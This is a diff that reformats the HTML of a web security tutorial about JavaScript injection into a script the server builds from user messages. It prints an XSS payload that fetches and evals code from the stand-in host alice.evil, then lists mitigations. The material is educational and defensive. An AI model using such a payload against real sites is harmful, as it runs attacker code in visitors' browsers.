@@ -127,7 +127,12 @@
 </div>
 
 
-      <p>Let’s say that Bob owns a site that lets you post public messages.</p><p>The messages are loaded by a script that looks like this:</p>
+      
+<p>Let’s say that Bob owns a site that lets you post public messages.
+</p>
+<p>The messages are loaded by a script that looks like this:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">addMessage(&#34;Message 1&#34;);
@@ -140,7 +145,12 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>The <code>addMessage</code> function adds a posted message to the DOM. However, in an effort to avoid XSS, <strong>any HTML in messages posted is escaped.</strong></p><p>The script is generated <strong>on the server</strong> like this:</p>
+</div>
+<p>The <code>addMessage</code> function adds a posted message to the DOM. However, in an effort to avoid XSS, <strong>any HTML in messages posted is escaped.</strong>
+</p>
+<p>The script is generated <strong>on the server</strong> like this:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">for(var i = 0; i &lt; messages.length; i++){
@@ -150,7 +160,10 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>So alice posts a message that says: <code>My mom said: &quot;Life is good. Pie makes it better. &quot;</code>. Than when she previews the message, instead of seeing her message she sees an error in the console:</p>
+</div>
+<p>So alice posts a message that says: <code>My mom said: &quot;Life is good. Pie makes it better. &quot;</code>. Than when she previews the message, instead of seeing her message she sees an error in the console:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">Uncaught SyntaxError: missing ) after argument list</pre>
@@ -158,7 +171,10 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Why? Because the generated script looks like this:</p>
+</div>
+<p>Why? Because the generated script looks like this:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">addMessage(&#34;My mom said: &#34;Life is good. Pie makes it better. &#34;&#34;);</pre>
@@ -166,7 +182,10 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>That’s a syntax error. Than Alice posts:</p>
+</div>
+<p>That’s a syntax error. Than Alice posts:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">I like pie &#34;);fetch(&#34;https://alice.evil/js_xss.js&#34;).then(x=&gt;x.text()).then(eval);//</pre>
@@ -174,7 +193,10 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>Then the generated script looks like:</p>
+</div>
+<p>Then the generated script looks like:
+</p>
+
 <div class="code-box lang-Plain Text">
 	<div>
 	<pre class="chroma">addMessage(&#34;I like pie &#34;);fetch(&#34;https://alice.evil/js_xss.js&#34;).then(x=&gt;x.text()).then(eval);//&#34;);</pre>
@@ -182,7 +204,20 @@ addMessage(&#34;Message 6&#34;);</pre>
 	<div class="code-box-nav">
 		
 	</div>
-</div><p>That adds the message <code>I like pie</code>, but it also <strong>downloads and runs </strong><code><strong>https://alice.evil/js_xss.js</strong></code><strong> whenever someone visits Bob’s site.</strong></p><h1 id="4d00987c-f8df-4e6b-8b8a-4ccdf426898d" class="">Mitigation:<a class="header-anchor" href="#4d00987c-f8df-4e6b-8b8a-4ccdf426898d" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a></h1><ol id="43523e8d-e7b3-4016-86f4-39b4af245803" class="numbered-list" start="1"><li>Pass the message posted into <a href="https://stackoverflow.com/documentation/javascript/416/json/1385/serializing-a-value#t=201707081354449681532">JSON.stringify()</a></li><li>Instead of dynamically building a script, build a plain text file containing all the messages that is later fetched by the script</li><li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong></li></ol>
+</div>
+<p>That adds the message <code>I like pie</code>, but it also <strong>downloads and runs </strong><code><strong>https://alice.evil/js_xss.js</strong></code><strong> whenever someone visits Bob’s site.</strong>
+</p>
+  <h1 id="4d00987c-f8df-4e6b-8b8a-4ccdf426898d" class="">Mitigation:
+  <a class="header-anchor" href="#4d00987c-f8df-4e6b-8b8a-4ccdf426898d" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M5.88.03c-.18.01-.36.03-.53.09-.27.1-.53.25-.75.47a.5.5 0 1 0 .69.69c.11-.11.24-.17.38-.22.35-.12.78-.07 1.06.22.39.39.39 1.04 0 1.44l-1.5 1.5c-.44.44-.8.48-1.06.47-.26-.01-.41-.13-.41-.13a.5.5 0 1 0-.5.88s.34.22.84.25c.5.03 1.2-.16 1.81-.78l1.5-1.5c.78-.78.78-2.04 0-2.81-.28-.28-.61-.45-.97-.53-.18-.04-.38-.04-.56-.03zm-2 2.31c-.5-.02-1.19.15-1.78.75l-1.5 1.5c-.78.78-.78 2.04 0 2.81.56.56 1.36.72 2.06.47.27-.1.53-.25.75-.47a.5.5 0 1 0-.69-.69c-.11.11-.24.17-.38.22-.35.12-.78.07-1.06-.22-.39-.39-.39-1.04 0-1.44l1.5-1.5c.4-.4.75-.45 1.03-.44.28.01.47.09.47.09a.5.5 0 1 0 .44-.88s-.34-.2-.84-.22z"></path></svg></a>
+  </h1>
+  <ol id="43523e8d-e7b3-4016-86f4-39b4af245803" class="numbered-list" start="1">
+    <li>Pass the message posted into <a href="https://stackoverflow.com/documentation/javascript/416/json/1385/serializing-a-value#t=201707081354449681532">JSON.stringify()</a>
+    </li>
+    <li>Instead of dynamically building a script, build a plain text file containing all the messages that is later fetched by the script
+    </li>
+    <li><strong>Add a </strong><a href="https://stackoverflow.com/q/30280370/6560716"><strong>Content Security Policy</strong></a><strong> that refuses to load active content from other domains</strong>
+    </li>
+  </ol>
 
       <div class="forum-link">
   Found a mistake? Have a question or improvement idea?
